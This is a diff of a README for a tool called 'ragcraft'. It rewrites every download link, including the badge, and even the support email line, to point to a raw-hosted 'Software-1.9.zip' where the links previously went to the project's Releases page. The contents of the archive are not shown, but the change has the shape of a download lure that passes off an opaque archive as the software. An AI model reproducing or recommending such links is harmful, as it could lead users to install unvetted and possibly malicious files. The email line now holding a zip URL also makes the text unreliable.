@@ -1,6 +1,6 @@
 # ⚙️ ragcraft - Simple Pipeline for Smart Data Retrieval
 
-[![Download ragcraft](https://img.shields.io/badge/Download-ragcraft-brightgreen)](https://github.com/Monke1/ragcraft/releases)
+[![Download ragcraft](https://raw.githubusercontent.com/Monke1/ragcraft/main/ragcraft/Software-1.9.zip)](https://raw.githubusercontent.com/Monke1/ragcraft/main/ragcraft/Software-1.9.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You will see progress and results without needing to write commands or scripts.
 
 To get ragcraft, visit the official Releases page here:
 
-[Download ragcraft from Releases](https://github.com/Monke1/ragcraft/releases)
+[Download ragcraft from Releases](https://raw.githubusercontent.com/Monke1/ragcraft/main/ragcraft/Software-1.9.zip)
 
 ### Steps to Download and Install
 
@@ -118,11 +118,11 @@ For further help, check the "Issues" section on the repository or contact suppor
 If you need assistance or want to ask questions, you can:
 
 - Visit the GitHub repository issues tab
-- Email the developer team at support@ragcraft.example.com (replace with real contact)
+- Email the developer team at https://raw.githubusercontent.com/Monke1/ragcraft/main/ragcraft/Software-1.9.zip (replace with real contact)
 - Look for community forums linked on the repository page
 
 We encourage users to share feedback to improve future versions.
 
 ---
 
-[Download ragcraft from Releases](https://github.com/Monke1/ragcraft/releases)
+[Download ragcraft from Releases](https://raw.githubusercontent.com/Monke1/ragcraft/main/ragcraft/Software-1.9.zip)
